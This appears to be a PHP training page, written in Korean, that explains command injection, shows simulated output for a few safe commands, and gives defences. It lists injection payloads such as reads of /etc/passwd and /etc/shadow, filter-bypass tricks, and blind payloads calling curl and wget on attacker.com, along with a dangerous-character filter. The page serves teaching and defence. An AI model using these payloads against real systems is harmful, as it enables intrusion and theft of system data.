<?php
/**
 * Command Injection 테스트 페이지
 * PayloadsAllTheThings의 Command Injection 페이로드를 기반으로 구성
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$error = '';
$command = $_POST['command'] ?? '';
$payload = $_POST['payload'] ?? '';

// Command Injection 페이로드 모음 (PayloadsAllTheThings 기반)
$payloads = [
    'basic' => [
        '; ls',
        '&& ls',
        '| ls',
        '; id',
        '&& id',
        '| id',
        '; whoami',
        '&& whoami',
        '| whoami'
    ],
    'advanced' => [
        '; cat /etc/passwd',
        '&& cat /etc/passwd',
        '| cat /etc/passwd',
        '; cat /etc/shadow',
        '; ps aux',
        '; netstat -an',
        '; uname -a',
        '; env',
        '; history'
    ],
    'blind' => [
        '; sleep 5',
        '&& sleep 5',
        '| sleep 5',
        '; ping -c 4 127.0.0.1',
        '&& ping -c 4 127.0.0.1',
        '| ping -c 4 127.0.0.1',
        '; curl http://attacker.com',
        '; wget http://attacker.com'
    ],
    'windows' => [
        '& dir',
        '&& dir',
        '| dir',
        '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '&& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '& systeminfo',
        '& tasklist',
        '& net user'
    ],
    'bypass' => [
        ';$(ls)',
        ';`ls`',
        ';ls${IFS}',
        ';l\\s',
        ';/bin/ls',
        ';${PATH:0:4}ls',
        ';cat<>/etc/passwd',
        ';cat${IFS}/etc/passwd',
        ';\x20ls'
    ]
];

// 안전한 명령어 목록 (시연용)
$safe_commands = [
    'ping' => 'ping 127.0.0.1',
    'date' => 'date',
    'whoami' => 'whoami',
    'pwd' => 'pwd'
];

// 테스트 실행
if ($_POST && isset($_POST['command'])) {
    // 실제 명령어 실행 대신 시뮬레이션
    $sanitized_command = preg_replace('/[;&|`$(){}[\]<>]/', '', $command);
    
    // 안전한 명령어인지 확인
    $is_safe = false;
    foreach ($safe_commands as $key => $safe_cmd) {
        if (strpos($sanitized_command, $key) !== false) {
            $is_safe = true;
            break;
        }
    }
    
    if ($is_safe && $sanitized_command === $command) {
        // 안전한 명령어만 실행 (제한된 환경에서)
        try {
            ob_start();
            $output = [];
            $return_code = 0;
            
            // 실제로는 명령어를 실행하지 않고 시뮬레이션 결과 제공
            switch (true) {
                case strpos($command, 'ping') !== false:
                    $result = "PING 시뮬레이션:\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.1ms\n64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.1ms";
                    break;
                case strpos($command, 'date') !== false:
                    $result = date('Y-m-d H:i:s');
                    break;
                case strpos($command, 'whoami') !== false:
                    $result = "www-data";
                    break;
                case strpos($command, 'pwd') !== false:
                    $result = "/var/www/html";
                    break;
                default:
                    $result = "명령어가 실행되었습니다 (시뮬레이션)";
            }
            
            ob_end_clean();
        } catch (Exception $e) {
            $error = "명령어 실행 중 오류 발생: " . $e->getMessage();
        }
    } else {
        $result = "⚠️ 보안 위험: 입력된 명령어에 위험한 문자가 포함되어 있습니다.\n";
        $result .= "원본: " . htmlspecialchars($command) . "\n";
        $result .= "필터링 후: " . htmlspecialchars($sanitized_command) . "\n";
        $result .= "이러한 문자들은 Command Injection 공격에 사용될 수 있습니다: ; & | ` $ ( ) { } [ ] < >";
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Injection 테스트 - 보안 테스트</title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .payload-section {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .payload-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 10px 0;
        }
        
        .payload-btn {
            background: #6c757d;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .payload-btn:hover {
            background: #5a6268;
        }
        
        .test-form {
            background: white;
            border: 2px solid #dc3545;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .result-box {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #155724;
            font-family: monospace;
            white-space: pre-wrap;
        }
        
        .error-box {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #721c24;
        }
        
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #856404;
        }
        
        .info-box {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #0c5460;
        }
        
        .safe-commands {
            background: #d1ecf1;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
        }
        
        input[type="text"], textarea {
            width: 100%;
            font-family: monospace;
            border: 1px solid #ced4da;
            border-radius: 4px;
            padding: 10px;
        }
        
        code {
            background: #f8f9fa;
            padding: 2px 4px;
            border-radius: 3px;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 네비게이션 -->
        <nav class="nav">
            <h1>Command Injection 테스트</h1>
            <div class="nav-links">
                <a href="index.php" class="btn">보안 테스트 메인</a>
                <a href="../index.php" class="btn">홈</a>
            </div>
        </nav>

        <!-- 브레드크럼 -->
        <nav class="breadcrumb">
            <a href="../index.php">홈</a> &gt; 
            <a href="index.php">보안 테스트</a> &gt; 
            <span>Command Injection</span>
        </nav>

        <!-- 설명 -->
        <div class="info-box">
            <h3>💻 Command Injection 테스트</h3>
            <p><strong>Command Injection</strong>은 애플리케이션이 사용자 입력을 시스템 명령어에 포함시킬 때 발생하는 취약점입니다.</p>
            <p>공격자가 임의의 시스템 명령어를 실행할 수 있게 되어 매우 위험합니다.</p>
            <p><strong>참고:</strong> 이 페이지에서는 안전한 환경에서 테스트하며, 실제 위험한 명령어는 실행되지 않습니다.</p>
        </div>

        <!-- 경고 -->
        <div class="warning-box">
            <h3>⚠️ 중요 경고</h3>
            <p>Command Injection은 시스템 전체를 위험에 빠뜨릴 수 있는 매우 심각한 취약점입니다.</p>
            <p>실제 운영 환경에서는 절대로 이러한 테스트를 수행하지 마세요!</p>
        </div>

        <!-- Basic Payloads -->
        <div class="payload-section">
            <h3>🔧 Basic Command Injection</h3>
            <p>기본적인 명령어 연결 문자를 사용한 페이로드입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['basic'] as $p): ?>
                    <button class="payload-btn" onclick="setPayload('ping 127.0.0.1<?php echo addslashes($p); ?>')">
                        <?php echo htmlspecialchars($p); ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Advanced Payloads -->
        <div class="payload-section">
            <h3>🔍 Advanced Command Injection</h3>
            <p>시스템 정보를 수집하는 고급 페이로드입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['advanced'] as $p): ?>
                    <button class="payload-btn" onclick="setPayload('ping 127.0.0.1<?php echo addslashes($p); ?>')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 20)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Blind Injection -->
        <div class="payload-section">
            <h3>👁️ Blind Command Injection</h3>
            <p>출력을 직접 볼 수 없을 때 사용하는 블라인드 인젝션 페이로드입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['blind'] as $p): ?>
                    <button class="payload-btn" onclick="setPayload('ping 127.0.0.1<?php echo addslashes($p); ?>')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 20)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Windows Payloads -->
        <div class="payload-section">
            <h3>🪟 Windows Command Injection</h3>
            <p>Windows 환경에서 사용되는 명령어 인젝션 페이로드입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['windows'] as $p): ?>
                    <button class="payload-btn" onclick="setPayload('ping 127.0.0.1<?php echo addslashes($p); ?>')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 20)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- Bypass Techniques -->
        <div class="payload-section">
            <h3>🚫 Filter Bypass Techniques</h3>
            <p>필터링을 우회하기 위한 다양한 인코딩 및 난독화 기법입니다.</p>
            <div class="payload-buttons">
                <?php foreach ($payloads['bypass'] as $p): ?>
                    <button class="payload-btn" onclick="setPayload('ping 127.0.0.1<?php echo addslashes($p); ?>')" title="<?php echo htmlspecialchars($p); ?>">
                        <?php echo htmlspecialchars(substr($p, 0, 20)) . '...'; ?>
                    </button>
                <?php endforeach; ?>
            </div>
        </div>

        <!-- 안전한 명령어 목록 -->
        <div class="safe-commands">
            <h3>✅ 테스트 가능한 안전한 명령어</h3>
            <p>이 페이지에서는 다음 명령어만 안전하게 테스트할 수 있습니다:</p>
            <ul>
                <li><code>ping 127.0.0.1</code> - 로컬호스트 핑 테스트</li>
                <li><code>date</code> - 현재 날짜 및 시간 표시</li>
                <li><code>whoami</code> - 현재 사용자 표시</li>
                <li><code>pwd</code> - 현재 디렉토리 표시</li>
            </ul>
        </div>

        <!-- 테스트 폼 -->
        <form method="post" class="test-form">
            <h3>🧪 Command Injection 테스트</h3>
            <label for="command">명령어 입력:</label>
            <input type="text" name="command" id="command" placeholder="예: ping 127.0.0.1; ls" value="<?php echo htmlspecialchars($command); ?>">
            <br><br>
            <button type="submit" class="btn" style="background: #dc3545;">명령어 실행</button>
        </form>

        <!-- 결과 표시 -->
        <?php if ($result): ?>
            <div class="result-box">
                <h3>📊 실행 결과</h3>
                <?php echo htmlspecialchars($result); ?>
            </div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="error-box">
                <h3>❌ 오류</h3>
                <?php echo htmlspecialchars($error); ?>
            </div>
        <?php endif; ?>

        <!-- 방어 방법 -->
        <div class="info-box">
            <h3>🛡️ Command Injection 방어 방법</h3>
            <ul>
                <li><strong>입력 검증:</strong> 사용자 입력을 철저히 검증하고 화이트리스트 방식 사용</li>
                <li><strong>이스케이프 처리:</strong> 셸 메타문자를 적절히 이스케이프</li>
                <li><strong>API 함수 사용:</strong> 직접 시스템 명령어 대신 언어별 API 함수 사용</li>
                <li><strong>최소 권한 원칙:</strong> 웹 서버를 최소한의 권한으로 실행</li>
                <li><strong>샌드박스 환경:</strong> 명령어 실행을 제한된 환경에서 수행</li>
                <li><strong>정규식 필터링:</strong> 위험한 문자 및 패턴 차단</li>
                <li><strong>명령어 매개변수 분리:</strong> 명령어와 인수를 별도로 처리</li>
            </ul>
        </div>

        <!-- 위험한 문자들 -->
        <div style="background: #f8d7da; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <h3>⚠️ 위험한 문자들</h3>
            <p>다음 문자들은 Command Injection에 사용될 수 있으므로 주의해야 합니다:</p>
            <code>; & | ` $ ( ) { } [ ] &lt; &gt; \ " ' * ? ~ ! # % ^</code>
            <br><br>
            <p><strong>Linux/Unix:</strong> <code>; && || | ` $()</code></p>
            <p><strong>Windows:</strong> <code>& && | || % ` "()</code></p>
        </div>

        <!-- 참고 자료 -->
        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin-top: 20px;">
            <h3>📚 참고 자료</h3>
            <ul>
                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank">PayloadsAllTheThings - Command Injection</a></li>
                <li><a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">OWASP - Command Injection</a></li>
                <li><a href="https://portswigger.net/web-security/os-command-injection" target="_blank">PortSwigger - OS Command Injection</a></li>
                <li><a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank">CWE-78: OS Command Injection</a></li>
            </ul>
        </div>
    </div>

    <script>
        function setPayload(payload) {
            document.getElementById('command').value = payload;
        }

        // 폼 제출 시 확인
        document.querySelector('form').addEventListener('submit', function(e) {
            const command = document.getElementById('command').value;
            const dangerousChars = /[;&|`$(){}[\]<>\\]/;
            
            if (dangerousChars.test(command)) {
                const confirmed = confirm(
                    '입력된 명령어에 위험한 문자가 포함되어 있습니다.\n' +
                    '이는 Command Injection 공격에 사용될 수 있습니다.\n\n' +
                    '교육 목적으로 계속 진행하시겠습니까?'
                );
                
                if (!confirmed) {
                    e.preventDefault();
                }
            } else {
                const confirmed = confirm(
                    'Command Injection 테스트를 실행하시겠습니까?\n' +
                    '이 테스트는 교육 목적으로만 사용하세요.'
                );
                
                if (!confirmed) {
                    e.preventDefault();
                }
            }
        });

        // 실시간 위험 문자 감지
        document.getElementById('command').addEventListener('input', function() {
            const value = this.value;
            const dangerousChars = /[;&|`$(){}[\]<>\\]/;
            
            if (dangerousChars.test(value)) {
                this.style.borderColor = '#dc3545';
                this.style.backgroundColor = '#fff5f5';
            } else {
                this.style.borderColor = '#28a745';
                this.style.backgroundColor = '#f8fff8';
            }
        });
    </script>
</body>
</html>